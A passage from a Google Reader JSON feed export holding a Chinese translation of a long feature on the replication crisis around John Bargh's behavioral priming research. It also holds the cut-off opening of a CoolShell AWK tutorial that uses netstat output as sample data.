      "content" : "<div><p>（文 / Tom Bartlett）在心理学的历史上，如今是最辉煌的时刻，也是最没落的时刻。现下，心理学中最绝妙的发现通常都是较为简化的结果，而且还为了迎合大众的口味进行了重新包装。如果你想出一本没有吸血鬼或绑缚情节的畅销书，编辑肯定会建议你给其中几篇心理学论文找些沾边的趣闻轶事，或者取个能吸引眼球、掷地有声的标题。不过，情况也不完全如此。对于那些研究更专业化问题的人，比如研究语音识别中音素单位的作用的学者，他们必须用这样一个事实来安慰自己：科学从本质上讲是不能一蹴而就的。但是，能提出有趣理论的有一夜蹿红的潜质。过去十几年，在意识的作用、人类行为的原因和动机方面， 社会心理学研究者取得了惊人发现。这些发现跟循序渐进不沾边。</p>\n\n<p>与此同时，心理学也深受丑闻与怀疑的困扰。迪德里克•斯塔佩尔（Diederik Stapel）、马克•豪泽（Marc Hauser）和德克•斯密斯特斯（Dirk Smeesters）等等曾经论调张扬的研究者，被控编造实验结果，而且设法躲过同行评审的监督，之后就眼睁睁地看着自己的事业轰然倒塌。心理学虽然并非唯一存在学术造假现象的学科，但是这个问题确实存在。而且这一学科还存在所谓的“文件抽屉问题”（file-drawer problem，也叫发表偏倚），也就是，研究人员往往会发表罕见的成功结果，而忽略他们实验中的大量失败结果，从而使某种侥幸结果看上去很像突破性进展。不论公正与否，社会心理学家确实被认为是对自己的实验方法并不那么严格的研究群体，他们一般不会重复自己或其他人的工作，而是加紧进行下一项能写出惊人标题的论文的研究。</p>\n\n<p>很多批评声音都将矛头指向启动效应的研究。“启动效应”的定义变得比较模糊，因为这个术语可以代指一系列现象。其中一些现象以数十年的可靠证据为根据，比如锚定效应（anchoring effect），当某商家在自己的标价牌旁列出竞争对手高昂的售价时，就是利用这个心理学效应让你觉得在这里买东西是占了大便宜。这一招也确实管用。</p>\n\n<p>而招致批评的研究则主要集中在被称作“行为启动”（Behavioral priming）或“目标启动”（Goal priming）的领域，这些研究展现了潜意识暗示如何使人做出各种疯狂行为。一只温热的马克杯会让你变得更友善。美国国旗让你将选票投给共和党。快餐标识让你变得急躁。有一小群对此持怀疑态度的心理学家，暂且把他们叫做“重复实验家”（Replicator），他们一直在自己的实验室里努力重复某些最广为人知的启动效应实验。</p>\n\n<p>他们发现了什么呢？大多数时候，他们都得不到与原实验类似的结果。这些研究禁不起检验。肯定是哪儿出了问题。约翰•巴奇（John Bargh）无疑是启动效应研究领域中的绝对权威，因此重复实验家特别留意了他，以及他那项最早针对启动效应的研究。</p>\n\n<p> </p>\n\n<h2 style=\"color:#4ba733;font-size:18px;font-weight:bold\">最早的“启动效应”研究：读单词让人步速放缓的实验</h2>\n\n<p>像很多有名的心理学实验一样，研究者不会告诉被试实验的真实目的。一名在纽约大学读本科的实验对象将一列单词重新排列成有意义的句子，然后研究人员告诉他，该实验是针对语言能力的研究。事实并非如此。其实，直到实验对象离开屋子后，真正的实验才开始。一名研究生待在走廊上，她的外套里面藏着一只秒表。她装作等着开会的样子，但实际上是一名研究人员。离测试室门口30多英尺（差不多10米）的走廊上，贴着一条银色胶带，她需要测量被试者走过这段距离的时间。整个实验全靠那只秒表了。</p>\n\n<p>实验人员要求被试重新排列的那些单词并不是随机的，尽管看上去的确如此（在每位被试者实验后的采访中，这一点得到了确认）。它们是类似于“宾果游戏”（bingo）、“福罗里达州”（Florida）、“针织品”（knits）、“皱纹”（wrinkles）、“痛苦”（bitter）和“单独”（alone）这样的一串单词。当你读这一串词时，你几乎都能想象出一个弯腰驼背的老人在公寓里轻轻地四处走动，同时还抱怨电视节目的情景。对照组的人则重新排列那些不会让人产生特定联想的单词。在比较两组人的步行时间时，研究者发现，总体而言，实验组走得比对照组慢。纸页上的单词让他们举止像老年人。</p>\n\n<p>这个发现挺有意思。但是你越想越觉得这似乎关系重大。如果我们总是受到这种微妙、注意不到的暗示的影响会怎么样？如果“福罗里达州”让你变得慢吞吞，“猎豹”这个词能让你健步如飞吗？暂且不说走路速度了。周遭的环境是否无意中让人变得更卑劣、更具创造力或者更蠢钝？我们都喜欢人生之舵握在自己手中这种观点，但实际上我们只是随波逐流怎么办？</p>\n\n<p>约翰•巴奇、马克•陈（Mark Chen）和拉拉•伯罗斯（Lara Burrows）在1990年或1991年做了这个实验，之后合作写了一篇论文。这篇论文直到1996年才发表。为什么要压着这样一个有趣的结果不发表呢？首先，他们想重复这个实验，而且也确实这样做了。他们也想用不同的暗示信号做类似的实验。其中一个类似实验的目的是，测试被试看到非裔美国人的面孔后是否变得更有敌意。被试（都不是非裔美国人）确实产生了这样的反应。在另一项实验中，实验人员首先让被试接触了一些无礼言辞，然后观察他们会不会因此更容易打断别人说话。结果被试的确变得更爱插嘴了。</p>\n\n<p>直到其他实验室也发现了同类现象，3人这才发表了这篇论文。他们知道自己的发现会引起争议。他们知道很多人不会相信这个结果。他们愿意当出头鸟，但是他们不想成为唯一把脖子伸出去让人砍的人。</p>\n\n<p>这项研究发表在《人格和社会心理学》杂志（Journal of Personality and Social Psychology）上，之后被引用了2000多次。尽管同时期甚至更早的时候，就有其他研究者做了类似的工作，但的确是这篇文章开启了启动效应的时代。3位作者甚至在发表这篇论文之前就明白，该论文很可能会产生深远的影响。他们写道：“很多社会心理学给我们的启示看起来非常值得深思。”</p>\n\n<p>言外之意：这个现象极其重要。</p>\n\n<p> </p>\n\n<h2 style=\"color:#4ba733;font-size:18px;font-weight:bold\">丑闻</h2>\n\n<p>约翰·巴奇9、10岁的时候，就决定长大后要成为一名心理学家。他想深入了解人类情感，因为人类情感是这样一种“对万事万物有神秘而巨大影响的力量”。他记得自己上高中时曾就斯金纳（B. F. Skinner，即伯尔赫斯•弗雷德里克•斯金纳，美国心理学家、行为学家，新行为主义的主要代表，操作性条件反射的奠基人）的理论与人发生争论。班上其他人都认为斯金纳的观点荒唐可笑。巴奇却不这样认为，倒不是因为他欣赏激进行为主义的主张或喜欢斯金纳通俗的文风。更多是因为他很吃独树一帜这一套。如今他说：“这个人的想法没人赞同，没准他就是对的呢。”</p>\n\n<p>2012年圣诞节前几周，某个周四的上午，我见到了巴奇。他当时穿着粗针毛衣、做旧牛仔裤和徒步靴。他已经58岁了，不过仍旧是满头乌发，发型凌乱得恰到好处。巴奇倚在苔绿色的组合家具上，一边大口喝着咖啡提神，一边批改厚厚一摞期末论文。他站起来欢迎我，之后坐下来，叹了一口气。</p>\n\n<p>对巴奇来说，2011年是艰难的一年。他事业的低谷应该出现在那年1月，当时《公共科学图书馆•综合》（PLoS ONE）上发表了一篇文章，说巴奇那个著名的步速放缓的研究结果无法被重复。这并不是第一个无法被重复的研究结果，但这一次戳到了他的痛处。实验中，研究人员尝试模仿巴奇的研究方法，但是有一项重要的改动：他们没有使用秒表，而是用自动计时装置和红外探测器，以排除所有可能的测量偏倚。实验结果表明，那些暗示性文字不会使被试走路速度变慢。他们又用秒表做了一次实验，不过稍微做了一点变动：他们告诉用秒表计时的人，哪些被试可能会走得慢些。这次的实验重复出了巴奇发表的结果。论文的标题说明了一切：《行为启动效应：都是大脑在作怪，不过是谁的脑子呢？》（Behavioral Priming: It's All in the Mind, but Whose Mind?）</p>\n\n<p>这篇论文让巴奇觉得心烦。他认为，那些研究者并没有完全按照他文章中所述的方法进行试验，尽管他们声称并非如此。但是真正让他气炸了的是一篇解释这一实验结果的博文。这篇文章将巴奇的实验与臭名昭著的“聪明汉斯”相提并论——汉斯就是那匹传说会数数的马。人们一开始认为汉斯是一匹有很强的数字感的神马，能用蹄子踩踏地面这种方式回答数学题。但事实上，汉斯只是读懂了驯马师的肢体语言而已。在这项研究中，巴奇本人扮演了掩人耳目的驯马师的角色。他不接受这样的说法。如果发表在PLoS ONE上的那篇论文是正确的，那巴奇的实验的重要性会大打折扣。而且，在别人眼中，他就像一个傻瓜，被实验设计中一个极为明显的缺陷耍得团团转。</p>\n\n<p>巴奇在《今日心理学》（Psychology Today）的网站上开设了博客，他在上面发了两篇详细的长文。他一一指出了自己眼中PLoS ONE上那篇论文里出现的各种错误。更重要的是，巴奇写道，在自己的实验中，用秒表计时的研究生不可能事前知道哪个被试会走得慢、哪个被试会走得快。与大多数科研圈的公开讨论相比，这两篇博文的语气确实强烈些，不过也说不上是吐沫横飞的咆哮体。巴奇在文章中使用了“不是无能就是无知的研究者”这样的字眼，明显是在抨击PLoS ONE那篇论文的作者。他还嘲笑PLoS ONE这本在线刊物监管不力，称重复实验论文是因为“塞了钱才发表出来”。巴奇博文的标题为《他们脑子里什么都没有》（Nothing in Their Heads），尽管这个标题可能只是想表达启动效应就是一种潜意识行为，不过这种双关并不怎么友好。</p>\n\n<p>对于那些从“相传信誉不错的在线媒体里找寻精确的心理科学信息”的读者，巴奇也在文中表示了关心。这是在挖苦之前那篇博文的作者Ed Yong，巴奇觉得Yong的文章不公正。“让我难过的不仅仅是那篇论文中的内容，还有Ed Yong对那篇论文的评述。”巴奇说。不过，Yong的文章是经得起推敲的新闻报道。Yong采访了研究人员，并且交代了来龙去脉。Yong的标题——《为何心理学经典实验并非看上去那样经典》——也许有些软，但内容是够硬的。</p>\n\n<p><img alt=\"\" src=\"http://img1.guokr.com/image/ghXmh9qYGNN6P-6RTOYcEwv4qnzovTBWQv1hmTiB3ObgAQAA4AEAAEpQ.jpg\" style=\"width:480px;height:480px\"></p>\n\n<h2 style=\"color:#4ba733;font-size:18px;font-weight:bold\"> </h2>\n\n<h2 style=\"color:#4ba733;font-size:18px;font-weight:bold\">“简化者”</h2>\n\n<p>在巴奇因论文和舆论沮丧的时候，重复实验论文几位作者也同样讶异于巴奇如此强烈的反应。“那反应确实让我们很困惑。”身为布鲁塞尔自由大学认知科学教授的阿克塞尔•克利尔曼斯（Axel Cleeremans）这样说。“显然，他的语气太轻蔑了，几乎就是赤裸裸的污蔑。他把我们描述成一群业余实验者，大家都明白不是这样的。”他们也不觉得巴奇对他们实验方法的批评有理有据。即使这样，他们还是又做了一遍这个实验，而且将巴奇提出质疑的地方都改进了。但这次实验还是无法得出与巴奇的原始实验一致的结果。</p>\n\n<p>他那两篇博文饱受非议，于是巴奇将它们删掉了。虽然他的观点没有改变，但是巴奇觉得自己的语气确实过分了。过去一个多月来我们谈了很多次，巴奇不时会搬出自己最近发表在《认知科学发展趋势》（Trends in Cognitive Sciences）上的一篇综述文章，竭力为自己的论文辩护。这篇文章列举了最近的启动效应方面的研究，搞得就像该领域研究现状的报告一样。简言之，科学不断向前，启动效应研究发展良好。</p>\n\n<p>他抱怨说自己是科研欺侮（Science bullying，一些支持巴奇的人也用了同样的表达方式）的受害者。不过，有时候，他看上去就是一副被打垮了的样子。“你把自己的全部事业和生命都投入到一项研究中，最后却发生了这样的事情。这太难接受了。”巴奇正是由于启动效应而闻名于世的。他说“我的名字就是代表这类效应的一个符号”，这并不是傲慢自大。这是事实。</p>\n\n<p>在1996年那篇论文发表之前，他已经发表了无意识自动心理过程方面的文章，收到了广泛重视并被多次引用，不过还是启动效应成就了他。几年前，对他的攻击还未开始时，巴奇在Edge网站的采访中阐释了自己的研究目的：“我们的研究是层层深入的，试图找到重要的心理学效应背后简单基础的原因。我们要找的是能诱发重大效应的简单而不是复杂的东西、简洁的过程或者概念。”这篇采访稿给他打上了“简化者”的标签。</p>\n\n<p>当我问他自己是否相信这些心理学效应的真实性时，巴奇说他相信。这些效应在不同的实验室都得到了印证。某些重复实验是对原始实验的精确复制：用秒表计时、让被试看同样一组单词等等。而其他的重复实验只求神似。他们都在研究一个相同的效应，但有的实验可能观察笔迹而不是走路速度，有的实验可能研究的是肥胖而非老年人的习惯。但是，这些研究的精髓是一样的。“不仅仅我的工作遭受非议，”巴奇说：“很多人的研究都遭受了攻击和摒弃。”他也怀疑过自己。面对如此质疑，他怎么可能没有怀疑过自己？即便你对自己所做的工作相当自信，但有人仔细检查你以前的论文，从里面找漏洞的时候，你肯定会如坐针毡。“也许是我们工作时的某个细节我没有注意。”他说道，并一一解释自己曾经产生过的想法。“然后你就开始在脑子里做检查了。”</p>\n\n<p>那么，为什么不动手实际检验一下呢？重新开展实验，再配备上能保证实验不出岔子的合理措施，这并不会产生多大花销。要让本科生连词成句，之后在楼廊上溜达一下，这并不需要专门去申请个基金。巴奇说，他不想强迫自己的研究生花时间做这种有污点的研究了，他们已经对自己的工作前景非常忧虑了。同样，他意识到某些批评者认定了他在耍花招，对于研究启动效应，他肯定有什么“独门秘笈”，这种评价听上去挺好，可根本就不是夸人的词儿。“我觉得没有人会相信我。”他说。</p>\n\n<p> </p>\n\n<h2 style=\"color:#4ba733;font-size:18px;font-weight:bold\">来自诺贝尔奖得主的调停</h2>\n\n<p>哈罗德•帕什勒（Harold Pashler）肯定不会相信他。帕什勒是加州大学圣地亚哥分校的一名心理学教授，在众多重复实验家中，他是最多产的一位。大约4年前，他就开始尝试启动效应的重复实验，帕什勒说：“我想亲眼看看这些现象。”这只是委婉地表达他认为这些现象可疑而已。目前帕什勒已经尝试了十几种实验了，包括那个步速放缓的研究。他从没得到过与巴奇一致的结果，一次都没有。</p>\n\n<p>今年秋天，诺贝尔奖得主心理学家丹尼尔•卡尼曼（Daniel Kahneman）给包括巴奇在内的一小群心理学家发了一封邮件，警告他们心理学研究“即将大祸临头”，因为启动效应的相关研究遭到种种质疑。卡<span style=\"font-size:14px;line-height:28px\">尼</span>曼直言不讳地写道：“我认为你们应该团结起来共同解决这个难题。要想有效地打消各种疑虑，你们应该首先承认怀疑确实存在，并且直面它们，因为反抗性的否认姿态只能让情况变得对自己更加不利。”</p>\n\n<p>出自诺贝尔奖获得者之笔、言辞犀利的邮件往往能引起人们的注意，而这一封也确实做到了。卡<span style=\"font-size:14px;line-height:28px\">尼</span>曼和巴奇一起讨论了那些针对启动效应研究的无情攻击后，将这封邮件发了出去。卡<span style=\"font-size:14px;line-height:28px\">尼</span>曼打算充当有点政界元老模样的调停人，他努力让相信和怀疑启动效应的人相互沟通。不过在这场辩论中，调停者也有他自己的立场：卡<span style=\"font-size:14px;line-height:28px\">尼</span>曼相信这些启动效应现象，每次写到巴奇的时候，字里行间都透着钦佩之情，卡<span style=\"font-size:14px;line-height:28px\">尼</span>曼的畅销书《思考，快与慢》（Thinking, Fast and Slow）便是佐证。</p>\n\n<p>高层指示下达以后，双方利用电子邮件展开了对话。与研究人员的即兴发挥或私下的谈话相比，这场对话的气氛缓和了很多。其中出现了卡<span style=\"font-size:14px;line-height:28px\">尼</span>曼所倡导的那种合作性的谈话，双方研究者以探求真理的名义通力协作。邮件对话进行得十分文明，不过却没什么成果。</p>\n\n<p>在一封邮件里，帕什勒抛出了一个看似温和无害、实则向对方叫板的问题：“你能不能提出一两个你觉得特别强有力的目标启动效应的例子，即便是不怎么出名的也可以？”言下之意就是，要么拿出确凿的证据，要么就闭嘴。给我看看你觉得确定无疑的证据，然后我来尝试重复实验结果。有人指责帕什勒和其他反对启动效应的人，专门拿漏洞最多的研究开刀，在成功地质疑之后就出来显摆；帕什勒说这话的目的就是要反驳这种指责。然而，他没有得到自己想要的正面回答。“有人提出了一些建议，但没人能给出一个实实在在的例子。” 帕什勒说。</p>\n\n<p>为什么这些研究结果总是令人困惑地无法被重复呢？一个可能的解释就是，这些研究中有一些隐秘的削弱性因素和敏感的外部条件，使得实验难以被复制。可是帕什勒认为，那些研究论文中从没有提到这些。他在同一封邮件中写道：“所以，单单阅读文献，我们不能解释为什么这些实验结果如此微妙和脆弱。”</p>\n\n<p>巴奇认为，与20世纪90年代相比，现在的确对这些现象了解得更多，这些现象也比研究者预想得更加复杂。这并不是问题，而是一种进步。如果你本来就不熟悉社会心理学领域的文献，也不熟悉众多改进和深化了先前结论的实验，那成功地重复出这些实验的结果就不太可能。这样一来，你就不能把自己重复实验的失败算作原始研究作假的证据，而事实上，你只是证明了自己对社会心理学研究并不怎么在行。</p>\n\n<p>帕什勒无法完全掩饰住自己对这种辩护的鄙视之情。他说：“对我来说，这完全说不通。你发表了这篇文章，那肯定表明你认为这项研究工作是能够被重复的吧。为什么我们就不能按照你的方法做出同样的结果呢？”</p>\n\n<p> </p>\n\n<h2 style=\"color:#4ba733;font-size:18px;font-weight:bold\">重复实验家的发现</h2>\n\n<p>大卫•尚克斯（David Shanks）赞同上述观点。他同样一直在尝试重复著名的启动效应研究，他也一直没有成功。作为英国伦敦大学学院的一名心理学教授，尚克斯在一篇即将发表的论文中详细列举了他和几位共同研究者如何尝试重复最有趣的启动效应研究——所谓的“教授暗示”（professor prime）。实验中，研究者让一组被试想象教授的生活，然后列出自己想到的教授的特征。而另一组被试则被要求想象并写下足球流氓的特征。</p>\n\n<p>然后，研究者会让两组被试回答桌面游戏“棋盘问答”（Trivial Pursuit，一种问答游戏，问题涉及常识和流行文化）中的问题，比如“名画《格尔尼卡》的作者是谁？”“孟加拉国的首都是哪里？”（答案分别是毕加索和达卡。）然后计算各组的得分。之前想象过教授的被试得分高于没有受过任何暗示的对照组。想象过足球流氓的被试者得分低于想象过教授的实验组，也低于对照组。想象教授的特征会让人变聪明，而想象流氓的特征则会让人变傻。这个实验被重复了很多次，甚至一个荷兰的电视节目也做过这个实验。</p>\n\n<p>尚克斯却得不到类似的结果。他真的努力尝试了，不止一次两次，而是9次。</p>\n\n<p>尚克斯说，对启动效应持怀疑态度的人，不仅限于致力于重复这些实验的人，不仅仅是重复实验家。“我认为，心理学研究领域中怀疑这些发现的真实性的人比你想象的多，不过他们只是在饮水处闲聊的时候才会说起这种想法。”尚克斯说：“他们不会把这些观点发表在学术期刊上。”</p>\n\n<p>尚克斯和跟我聊过的所有怀疑者一样，他相信启动效应要面对的最糟糕的情况还没有出现，他预测，“接下来两三年中，你会看到启动效应重复失败的论文会如潮水般涌现在期刊上。”这样的论文潮可能会出现的更早。目前期刊已经将一些实验重复失败的论文放在网上供读者预览评论，而更多类似的论文已经写好了（尚克斯那篇关于教授暗示的文章已经在PloS ONE的网站上贴出了预览版）。我采访过的几位研究者并不愿意在同行评议之前谈论自己的实验结果，不过他们的初步结果并不怎么振奋人心。</p>\n\n<p>艾普•迪克特赫斯（Ap Dijksterhuis）是教授暗示实验那篇论文的作者。迪克特赫斯是荷兰内梅亨大学的一名心理学教授，他一开始并不愿意接受有关那篇文章的采访。那项研究已经不是什么新闻了，他的文章发表于1998年。而几年前他就已经不再从事潜意识过程的相关研究了，一部分是因为他想从事与幸福有关的研究，另一部分原因则是潜意识过程研究总是受到攻击和怀疑。他已经受够了。</p>\n\n<p>迪德里克•斯塔佩尔丑闻的曝光使讨论气氛变得更差了。斯塔佩尔是荷兰蒂尔堡大学的一名社会心理学家，他发表的很多论文都被指出存在学术不端问题。无论是造假的深度或广度，都让人大跌眼镜，这改变了对话的主题。“这就不是学术研究有待改进的问题了，这是学术造假。”迪克特赫斯这样评论斯塔佩尔的学术丑闻。“我认为这种行径一直影响着学术圈。现在，人们几乎会觉得，那些的确找到有效数据的人其实犯了错误，他的研究很糟糕，甚至可能在进行学术造假。”</p>\n\n<p>在卡<span style=\"font-size:14px;line-height:28px\">尼</span>曼号召发起的那场电子邮件讨论中，迪克特赫斯列举了若干可能的原因，用以解释为什么怀疑者在尝试启动效应研究时得不到结果。其中一项就是文化差异。荷兰和美国对偏见的研究是不一样的。某些被试并不容易受某些暗示的影响，特别是那些自我意识强烈的被试。在一次采访中，他提出了另一个可能性，这个可能性就没有之前的那些大气了。“可能他们是糟糕的实验者，”迪克特赫斯说：“他们也许认为自己证明了，这些已经被十几人甚至二十人印证的结果是不能重复的。但基本上，这只能证明是他们自己出了问题，他们实验室里出了差错。”</p>\n\n<blockquote>\n<p><span style=\"font-size:14px;line-height:28px\">他发现了最引人注目的现象。他总能做到这一点。……</span> 他本人就是一种暗示。</p>\n</blockquote>\n\n<p>约瑟夫•西萨里奥（Joseph Cesario）对启动效应半信半疑，不过近来他更倾向于对其持怀疑态度。西萨里奥是密歇根州立大学的一位社会心理学家，他成功地重复了巴奇所做的步速放缓的实验，同时发现，在实验过程中被试对老年人的态度决定了这个效应是否会起作用。如果被试者讨厌老年人，那他的脚步就不会慢下来。实验中存在削弱启动效应的因素而使实验结果很难重复，很多细微的不利因素都会导致实验失败，他赞成这种说法。不过这种理由是远远不够的。“在某些情况下，这种说辞成了一种借口。”西萨里奥说：“一小群研究者总是反复碰到削弱启动效应的因素而失败，这是不行的。”</p>\n\n<p>西萨里奥最近一直在试图重复巴奇的最新研究结果。在这项去年发表在期刊《情绪》（Emotion）上的研究中，巴奇与共同研究者伊迪特•沙莱夫（Idit Shalev）询问了被试的个人卫生习惯——洗澡的频率、时长和喜欢多高的水温。他们同样让被试接受了用以评估社会隔离程度的标准测试，也就是要看看被试有多孤独。他们发现，孤独的人往往花更多时间洗澡，而且使用的水温更高，似乎是想用热水来温暖因缺乏经常性的社交活动而冰冷的心。</p>\n\n<p>确切来讲，这不能算启动效应，尽管这的确是一种通常被称作“具身认知”（embodied cognition）相关的潜意识现象。和步速放缓研究中所出现的情况一样，被试没有意识到自己的行为，不知道自己因为孤独而花更多时间洗澡。热水能够驱散孤独感吗？这个研究结果与日常生活息息相关，引得媒体争相报道。《泡个长长的热水澡能洗去内心的孤独》，NBC新闻打出了这样的标题。</p>\n\n<p>92名被试参与了巴奇的研究。而到目前为止，西萨里奥已经对2500多名被试进行了相同的实验。他发现泡澡和孤独之间完全没有联系。一点都没有。“如果你让人觉得只要洗个澡就能治好他的抑郁症，这样做非常危险。” 西萨里奥说。他觉得巴奇的数据也相当棘手。“极其小的样本量，极其之大的现象，这是个危险信号。”西萨里奥说：“对于发表研究结果的人来说，这不是个危险信号，但研究者应该注意。”</p>\n\n<p>尽管西萨里奥之言在某种意义上是针对巴奇的，但西萨里奥认为整场争论这样对人不对事，是很令人遗憾的，好像给人举行公投一样。“他发现了最引人注目的现象。他总能做到这一点。”西萨里奥说：“由于巴奇本人就是启动效应的标志，他发现的某些现象无法被他人重复，从这种意义上讲，这使所有启动效应研究都遭到质疑。他本人就是一种暗示。”</p>\n\n<p>故事原本就是这样。巴奇的研究在严格的审查下变得支离破碎，同时启动效应也变得破败不堪。过去几十年中，社会心理学中最令人激动的领域就是启动效应相关的实验，这些近乎神奇的实验中，人们在毫无察觉的情况下变得更加聪明或走路速度变慢，也许最后它们会成为社会心理学中一个尴尬的注脚，而不是里程碑式的成就。</p>\n\n<p>然后加里•莱瑟姆（Gary Latham）出现了。</p>\n\n<p> </p>\n\n<h2 style=\"color:#4ba733;font-size:18px;font-weight:bold\">转折</h2>\n\n<p><img alt=\"\" src=\"http://img1.guokr.com/image/Y6HJlg62B_OcIw5Y2Ms6F4hpLHck8MQ_km8sVMCud_hFAQAABAEAAEpQ.jpg\" style=\"width:285px;height:228px;float:right;border-width:0px;border-style:solid;margin:8px 5px\"> 莱瑟姆是多伦多大学管理学院的一名组织心理学家，他觉得巴奇等人做的那些实验全是扯淡。“扯淡”这个词儿是他的原话。他告诉自己的一个研究生阿曼达•尚茨（Amanda Shantz），如果她能尝试应用巴奇的启动效应原理，那肯定会有双赢效果。如果没成功，他们就能发表一篇能帮助抹黑启动效应的论文。如果成功了，那就有意思了。</p>\n\n<p>他们做了个预实验，首先给被试者看了张一个女性赢得跑步比赛的照片，然后让他们参加一个需要集思广益的任务。如巴奇的研究预测的那样，那张照片让他们在该任务中表现得更出色。至少看起来如此。之后，莱瑟姆又和另一个实验室合作进行了一遍这个实验。这一次，被试是来自某大学资金募集活动呼叫中心的员工。他们被分成三组。研究人员给了每个小组一张打电话时可以看到的情况说明书。在情况说明书左上角的位置有一张照片，上面是女性赢得比赛的情景，或者是呼叫中心员工的一般情境，或者该位置没有照片。这次的实验结果仍旧与巴奇的一致，受到照片暗示的被试募集到了更多资金。受呼叫中心员工照片暗示的被试募集的资金数目最多，看到跑步比赛冠军照片的被试者其次，这两组被试都比无照片的对照组募集了更多资金。但实验后被问到时，被试都回答自己太忙了，根本就没注意到那些照片，即便这样，这一结果依然成立。</p>\n\n<p>莱瑟姆打心眼儿里不希望巴奇是对的。“我开始这项实验的时候，对巴奇的实验结果非常怀疑，根本就不相信。” <span style=\"font-size:14px;line-height:28px\">莱瑟姆</span> 说：“看到我的实验数据支持巴奇的发现的那一刻，我几乎从椅子上摔了下来。”</p>\n\n<p>这个实验改变了莱瑟姆对启动效应的看法，并让他现在开始思索日常生活中潜意识暗示的应用。有没有照片能让人工作时表现更出色？会不会有让人表现更差的照片？应该如何对周围的影响因素做细微调整呢？“这些环境里的这类暗示信号会以各种方式潜移默化地影响我们，这几乎让人不寒而栗。”他说。莱瑟姆没有就此止步。他继续利用巴奇的观点尝试其他实验，而最终结果只是让他对启动效应的信心更加足了。“我又得到了两个让人兴奋的结果。” 莱瑟姆说：“我知道约翰•巴奇还不知情，不过他看到结果的时候就会笑开花了。”</p>\n\n<p>莱瑟姆不知道为什么其他人在重复实验的时候出了这么多麻烦。他只知道自己发现了什么，而且他对自己的实验数据确信无疑。莱瑟姆相信，最后巴奇会洗脱嫌疑，成为潜意识动机研究的先驱。“我就像被感化了的基督徒。起初我还是个笃信无神论的人，现在我成了一个信徒。”他说。</p>\n\n<p>观念转变后，莱瑟姆给巴奇发了一封电子邮件，将自己的呼叫中心实验的相关情况告诉他。当我对巴奇提起这些的时候，他的脸上终于出现了一丝喜色，这是我们谈话开始以来他第一次出现这样的表情。“你可以想象，那对我的帮助有多大。”巴奇说。一直以来他都觉得自己孤立无援、四面楚歌，担心自己会给后人留下一段有警示意味的故事。“我觉得自己就像在一座孤岛上一样。”他说。</p>\n\n<p>尽管莱瑟姆现在已经是相信启动效应的研究者了，但他并非全无异议。研究圈子里涌现出越来越多的重复失败的实验。迪克特赫斯相信，虽然卡<span style=\"font-size:14px;line-height:28px\">尼</span>曼是一番好意，但他那封警示“马上大祸临头”的邮件可能会变成自我应验的预言，不仅没能挽救启动效应研究，反而使其面临分崩离析的危险。恐怕这种看法的影响已经太过消极，以致之后的重复实验无论结果如何，都变得不重要了。对巴奇来说，他尽力将目光放长远些。“我们得考虑50年或100年之后的事，那时候人们会相信这个理论吗？”他说：“也许启动效应不是真的。让我们看它是不是吧。”</p>\n\n<p> </p>\n\n<p><strong>编译自：</strong> 《高等教育纪事报》Power of Suggestion<br><strong>文章图片：</strong> chronicle.com；tumbler.com（小图）imprint.printmag.com</p></div><img src=\"http://analytics.guokr.com/ga.gif?utmp=/article/436704/&amp;utmac=UA-19521615-11&amp;cookie_name=utmrss&amp;guid=on&amp;utmn=4230325044\">"
    },
    "author" : "JacquelineShawn",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://www.guokr.com/rss/",
      "title" : "果壳网 guokr.com",
      "htmlUrl" : "http://www.guokr.com/"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1361106003927",
    "timestampUsec" : "1361106003927643",
    "id" : "tag:google.com,2005:reader/item/4a267eb6a2f86708",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred", "Unix/Linux", "杂项资源", "编程工具", "awk", "gawk", "Linux", "Shell", "Unix" ],
    "title" : "AWK 简明教程",
    "published" : 1361061509,
    "updated" : 1361061509,
    "alternate" : [ {
      "href" : "http://coolshell.cn/articles/9070.html",
      "type" : "text/html"
    } ],
    "content" : {
      "direction" : "ltr",
      "content" : "<p><img alt=\"\" src=\"http://coolshell.cn//wp-content/uploads/2013/02/awk.jpg\" width=\"350\" height=\"279\">有一些网友看了前两天的《<a title=\"应该知道的Linux技巧\" href=\"http://coolshell.cn/articles/8883.html\">Linux下应该知道的技巧</a>》希望我能教教他们用awk和sed，所以，出现了这篇文章。我估计这些80后的年轻朋友可能对awk/sed这类上古神器有点陌生了，所以需要我这个老家伙来炒炒冷饭。<strong>况且，AWK是贝尔实验室1977年搞出来的文本出现神器，今年是蛇年，是AWK的本命年，而且年纪和我相仿，所以非常有必要为他写篇文章</strong>。</p>\n<p>之所以叫AWK是因为其取了三位创始人 <a title=\"Alfred Aho\" href=\"http://en.wikipedia.org/wiki/Alfred_Aho\">Alfred Aho</a>，<a title=\"Peter J. Weinberger\" href=\"http://en.wikipedia.org/wiki/Peter_J._Weinberger\">Peter Weinberger</a>, 和 <a title=\"Brian Kernighan\" href=\"http://en.wikipedia.org/wiki/Brian_Kernighan\">Brian Kernighan</a> 的Family Name的首字符。要学AWK，就得提一提AWK的一本相当经典的书《<a href=\"http://plan9.bell-labs.com/cm/cs/awkbook/\" rel=\"nofollow\">The AWK Programming Language</a>》，它在<a href=\"http://book.douban.com/subject/1876898/\">豆瓣上的评分</a>是9.4分！在<a href=\"http://www.amazon.cn/mn/detailApp/?asin=020107981X\">亚马逊上居然卖1022.30元</a>。</p>\n<p>我在这里的教程并不想面面俱到，本文和我之前的<a title=\"Go 语言简介（上）— 语法\" href=\"http://coolshell.cn/articles/8460.html\">Go语言简介</a>一样，全是示例，基本无废话。</p>\n<p><strong>我只想达到两个目的：</strong></p>\n<p style=\"text-align:left;padding-left:30px\"><strong>1）你可以在乘坐公交地铁上下班，或是在坐马桶拉大便时读完（保证是一泡大便的工夫）。</strong></p>\n<p style=\"text-align:left;padding-left:30px\"><strong>2）我只想让这篇博文像一个火辣的脱衣舞女挑起你的兴趣，然后还要你自己去下工夫去撸。</strong></p>\n<p>废话少说，我们开始脱吧（注：这里只是topless）。</p>\n<h4>起步上台</h4>\n<p>我从netstat命令中提取了如下信息作为用例：</p>\n<p><span></span></p>\n<pre>$ cat netstat.txt\nProto Recv-Q Send-Q Local-Address          Foreign-Address             State\ntcp        0      0 0.0.0.0:3306           0.0.0.0:*                   LISTEN\ntcp        0      0 0.0.0.0:80             0.0.0.0:*                   LISTEN\ntcp        0      0 127.0.0.1:9000         0.0.0.0:*                   LISTEN\ntcp        0      0 coolshell.cn:80        124.205.5.146:18245         TIME_WAIT\ntcp        0      0 